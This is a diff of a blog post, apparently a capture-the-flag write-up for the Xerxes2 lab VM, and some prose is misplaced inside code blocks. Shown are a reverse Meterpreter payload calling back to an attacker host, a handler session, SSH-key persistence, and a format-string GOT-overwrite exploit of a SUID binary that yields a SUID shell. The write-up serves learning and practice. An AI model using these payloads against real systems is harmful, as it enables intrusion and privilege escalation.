 <p>Oooh, I spy the word LAME, which means this is an MP3. If you want to hear the MP3, you can download it <a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2.mp3">right here</a>. Not very exciting huh ?</p>
 
@@ -218,27 +305,49 @@ root@pwk:~# hexedit out.bin</p>
 
 <p>At this point I decided to be sneaky and make this download and run a reverse Meterpreter binary&hellip; I created my binary using msfpayload, hosted it on an internal HTTP server, and then set up a multi/handler to accept the connection.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.0.110 lport=4444 x > xerxes_4444
-Created by msfpayload (<a href="http://www.metasploit.com">http://www.metasploit.com</a>).
-Payload: linux/x86/meterpreter/reverse_tcp
- Length: 71
-Options: {&ldquo;LHOST&rdquo;=>&ldquo;192.168.0.110&rdquo;, &ldquo;LPORT&rdquo;=>&ldquo;4444&rdquo;}
-root@pwk:~# cp xerxes_4444 /var/www[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.110 <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span> x &gt; xerxes_4444
+</span><span class='line'>Created by msfpayload <span class="o">(</span>http://www.metasploit.com<span class="o">)</span>.
+</span><span class='line'>Payload: linux/x86/meterpreter/reverse_tcp
+</span><span class='line'> Length: 71
+</span><span class='line'>Options: <span class="o">{</span><span class="s2">&quot;LHOST&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;192.168.0.110&quot;</span>, <span class="s2">&quot;LPORT&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;4444&quot;</span><span class="o">}</span>
+</span><span class='line'>root@pwk:~# cp xerxes_4444 /var/www
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# msfconsole
-msf > use multi/handler
-msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
-payload => linux/x86/meterpreter/reverse_tcp
-msf exploit(handler) > set lhost 192.168.0.110
-lhost => 192.168.0.110
-msf exploit(handler) > set lport 4444
-lport => 4444
-msf exploit(handler) > run</p>
 
-<p>[<em>] Started reverse handler on 192.168.0.110:4444
-[</em>] Starting the payload handler&hellip;[/plain]</p>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfconsole
+</span><span class='line'>msf &gt; use multi/handler
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
+</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
+</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 4444
+</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 4444
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:4444
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>The following command pasted into the Python notebook application downloads the binary from the HTTP server to /tmp, makes it executable, and then executes it.</p>
 
@@ -246,17 +355,28 @@ msf exploit(handler) > run</p>
 
 <p>A reverse connection is received by the multi/handler, which allows us to get a shell as delacroix, but it disconnects after a certain amount of time.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-[<em>] Sending stage (1138688 bytes) to 192.168.0.102
-[</em>] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.102:34718) at 2014-08-08 13:20:31 +0100</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1138688</span> bytes<span class="o">)</span> to 192.168.0.102
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:4444 -&gt; 192.168.0.102:34718<span class="o">)</span> at 2014-08-08 13:20:31 +0100
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt; shell
+</span><span class='line'>Process <span class="m">14990</span> created.
+</span><span class='line'>Channel <span class="m">1</span> created.
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span>
+</span><span class='line'><span class="err">$</span>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.0.102 - Meterpreter session <span class="m">1</span> closed.  Reason: Died
+</span></code></pre></td></tr></table></div></figure>
 
-<p>meterpreter > shell
-Process 14990 created.
-Channel 1 created.
-$ id
-uid=1002(delacroix) gid=1002(delacroix) groups=1002(delacroix)
-$
-[*] 192.168.0.102 - Meterpreter session 1 closed.  Reason: Died[/plain]</p>
 
 <p><img src="http://media.giphy.com/media/8x6MVS4l7wh3O/giphy.gif" alt="" /></p>
 
@@ -266,25 +386,40 @@ $
 
 <p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#100;&#x65;&#108;&#x61;&#x63;&#x72;&#111;&#x69;&#x78;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x30;&#46;&#49;&#x30;&#x32;">&#100;&#x65;&#108;&#97;&#99;&#x72;&#x6f;&#105;&#x78;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#48;&#46;&#49;&#48;&#50;</a></p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh delacroix@192.168.0.102
+</span><span class='line'>
+</span><span class='line'>Welcome to xerxes2.
+</span><span class='line'>      XERXES wishes you
+</span><span class='line'>       a pleasant stay.
+</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
+</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
+</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
+</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM</span>
+</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
+</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
+</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
+</span><span class='line'>
+</span><span class='line'>/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Welcome to xerxes2.
-      XERXES wishes you
-       a pleasant stay.</p>
-
-<hr />
-
-<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
-</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
- </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
-  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
-   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;
-  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;
-<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>
-
-<p>/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
-delacroix@xerxes2:~$ [/plain]</p>
 
 <p><img src="http://img3.wikia.nocookie.net/__cb20140515210256/sailormoon/images/3/3c/Stephen-colbert-celebration-gif.gif" alt="" /></p>
 
@@ -298,34 +433,60 @@ delacroix@xerxes2:~$ [/plain]</p>
 
 <p>First things first, lets get a list of possible users from /etc/passwd</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-delacroix@xerxes2:~$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-Debian-exim:x:101:103::/var/spool/exim4:/bin/false
-statd:x:102:65534::/var/lib/nfs:/bin/false
-sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
-korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
-polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
-delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>cat /etc/passwd
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
+</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
+</span><span class='line'>polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
+</span><span class='line'>delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>The delacroix user has source code for an application in their home folder.</p>
 
@@ -434,39 +595,61 @@ bf(argv[1], buf);
 exit(0);
 </code></pre>
 
-<p>}[/c]</p>
+<p>}</p>
 
-<p>It looks like some kind of interpreter - what language uses +-&lt;>,. and # ? Well, I know for a fact that <a href="http://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a> uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don&rsquo;t let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>It looks like some kind of interpreter - what language uses +-&lt;&gt;,. and <span class="c"># ? Well, I know for a fact that [Brainfuck](http://en.wikipedia.org/wiki/Brainfuck) uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don&#39;t let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-delacroix@xerxes2:~$ /opt/bf &ldquo;++++++++[>++++[>++>+++>+++>+&lt;&lt;&lt;&lt;-]>+>+>->>+[&lt;]&lt;-]>>.>&mdash;.+++++++..+++.>>.&lt;-.&lt;.+++.&mdash;&mdash;.&mdash;&mdash;&ndash;.>>+.>++.&rdquo;
+
+<p> bash</p>
+
+<p>delacroix@xerxes2:~$ /opt/bf &ldquo;++++++++[>++++[>++>+++>+++>+&lt;&lt;&lt;&lt;-]>+>+>->>+[&lt;]&lt;-]>>.>&mdash;.+++++++..+++.>>.&lt;-.&lt;.+++.&mdash;&mdash;.&mdash;&mdash;&ndash;.>>+.>++.&rdquo;
 Hello World!
-delacroix@xerxes2:~$ [/plain]</p>
+delacroix@xerxes2:~$</p>
 
-<p>Yup, it&rsquo;s Brainfuck. Shit.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Yup, it<span class="s1">&#39;s Brainfuck. Shit.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">![](http://files.abovetopsecret.com/files/img/gm5273ef16.gif)</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">However, it is owned by the polito user, and has SUID set.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">So, lets start basic. Here&#39;</span>s my process of trying to find things in the stack.
+</span></code></pre></td></tr></table></div></figure>
 
-<p><img src="http://files.abovetopsecret.com/files/img/gm5273ef16.gif" alt="" /></p>
 
-<p>However, it is owned by the polito user, and has SUID set.</p>
+<p> bash</p>
 
-<p>The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.</p>
-
-<p>So, lets start basic. Here&rsquo;s my process of trying to find things in the stack.</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-delacroix@xerxes2:~$ echo &lsquo;AAAA%17$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
+<p>delacroix@xerxes2:~$ echo &lsquo;AAAA%17$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
 AAAA24373125
 delacroix@xerxes2:~$ echo &lsquo;AAA%17$xBBBB.%18$x&hellip;.%19$x&hellip;&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;
 AAA78243731BBBBB.42424242&hellip;.31252e42
 delacroix@xerxes2:~$ echo &lsquo;AAAA%16$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
-AAAA41414141[/plain]</p>
+AAAA41414141</p>
 
-<p>OK, so I can put things into the buffer and find them in the stack. However, there&rsquo;s a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably&hellip; what about gdb, I know that <a href="http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/">disables ASLR</a>, but it also disables SUID, so that&rsquo;s out. Google to the rescue ! The <a href="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home">following site</a> helpfully tells me that ulimit -s unlimited disables ASLR on 32bit systems, so that&rsquo;s my golden ticket.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so I can put things into the buffer and find them in the stack. However, there<span class="s1">&#39;s a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably... what about gdb, I know that [disables ASLR](http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/), but it also disables SUID, so that&#39;</span>s out. Google to the rescue ! The <span class="o">[</span>following site<span class="o">](</span>http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home<span class="o">)</span> helpfully tells me that <span class="nb">ulimit</span> -s unlimited disables ASLR on 32bit systems, so that<span class="err">&#39;</span>s my golden ticket.
+</span><span class='line'>
+</span><span class='line'>So, with ASLR temporarily disabled, I can find the location <span class="k">for</span> the <span class="nb">printf </span>got pointer using objdump.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>So, with ASLR temporarily disabled, I can find the location for the printf got pointer using objdump.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-delacroix@xerxes2:~$ ulimit -s unlimited
+<p> bash</p>
+
+<p>delacroix@xerxes2:~$ ulimit -s unlimited
 delacroix@xerxes2:~$ objdump -R /opt/bf</p>
 
 <p>/opt/bf:     file format elf32-i386</p>
@@ -480,12 +663,16 @@ OFFSET   TYPE              VALUE
 08049a54 R_386_JUMP_SLOT   exit
 08049a58 R_386_JUMP_SLOT   __libc_start_main
 08049a5c R_386_JUMP_SLOT   memset
-08049a60 R_386_JUMP_SLOT   putchar[/plain]</p>
+08049a60 R_386_JUMP_SLOT   putchar</p>
 
-<p>printf is at 08049a48. Now I have to find system(). gdb can help with that.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf </span>is at 08049a48. Now I have to find system<span class="o">()</span>. gdb can <span class="nb">help </span>with that.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-delacroix@xerxes2:~$ gdb /opt/bf
+
+<p> bash</p>
+
+<p>delacroix@xerxes2:~$ gdb /opt/bf
 GNU gdb (GDB) 7.4.1-debian
 Copyright &copy; 2012 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
@@ -505,17 +692,24 @@ Starting program: /opt/bf</p>
 (gdb) p system
 $1 = {<text variable, no debug info>} 0x40062000 <system>
 (gdb) p printf
-$2 = {<text variable, no debug info>} 0x4006ff50 <printf>
-[/plain]</p>
+$2 = {<text variable, no debug info>} 0x4006ff50 <printf></p>
 
-<p>I need to overwrite 0x08049a48 with 0x40062000 - that shouldn&rsquo;t be too hard. I really only need to change the last 2 bytes from ff50 to 2000, which means I can do this with just one write. After lots of debugging I ended up at the following</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I need to overwrite 0x08049a48 with 0x40062000 - that shouldn<span class="err">&#39;</span>t be too hard. I really only need to change the last <span class="m">2</span> bytes from ff50 to 2000, which means I can <span class="k">do</span> this with just one write. After lots of debugging I ended up at the following
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo;&rdquo;)%8186u%16\$hn | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;[/plain]</p>
 
-<p>I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I&rsquo;d talk to him</p>
+<p> bash</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;][23:16:17]  <recrudesce>  delacroix@xerxes2:~$ echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>#&rdquo;
+<p>echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo;&rdquo;)%8186u%16\$hn | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I<span class="err">&#39;</span>d talk to him
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p> bash
+[23:16:17]  <recrudesce>    delacroix@xerxes2:~$ echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>#&rdquo;
 [23:16:19]  <recrudesce>    returns A
 [23:16:24]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>#&rdquo; returns B
 [23:16:30]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>&lt;,#&rdquo; = C
@@ -534,25 +728,38 @@ echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo;&rdquo;)%8186u%16\$h
 [23:19:37]  <recrudesce>    so, all we need to do is go back to a few pointers, and re-read some further data in
 [23:20:08]  <c0ne>  Oo
 [23:20:11]  <recrudesce>    so, we need to make sure that the correct amount of ,> are before our first #
-[23:20:18]  <recrudesce>    else we accidently read /bin/bash too[/plain]</p>
+[23:20:18]  <recrudesce>    else we accidently read /bin/bash too</p>
 
-<p>Many many failures were experienced at this point - and I&rsquo;m talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here&rsquo;s what you have to do. Make a shell script in /tmp containing the following</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Many many failures were experienced at this point - and I<span class="s1">&#39;m talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here&#39;</span>s what you have to <span class="k">do</span>. Make a shell script in /tmp containing the following
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>bash<span class="o">]</span>
+</span><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'>cp /bin/sh /tmp/shell
+</span><span class='line'>chmod <span class="m">4777</span> /tmp/shell<span class="o">[</span>/bash<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>chmod +x the file so it is executable, and <span class="k">then</span> run the following
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[bash]</p>
 
-<h1>!/bin/sh</h1>
+<p> bash
+delacroix@xerxes2:~$ echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;%8186u%16\$hn;\/tmp\/123.sh\x00&rsquo;&rdquo;) | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;</p>
 
-<p>cp /bin/sh /tmp/shell
-chmod 4777 /tmp/shell[/bash]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>It will probably throw an error, but the shell script will run and you<span class="err">&#39;</span>ll end up with a copy of /bin/sh in /tmp, with the SUID bit <span class="nb">set</span>, which when run will elevate you to the polito user.
+</span></code></pre></td></tr></table></div></figure>
 
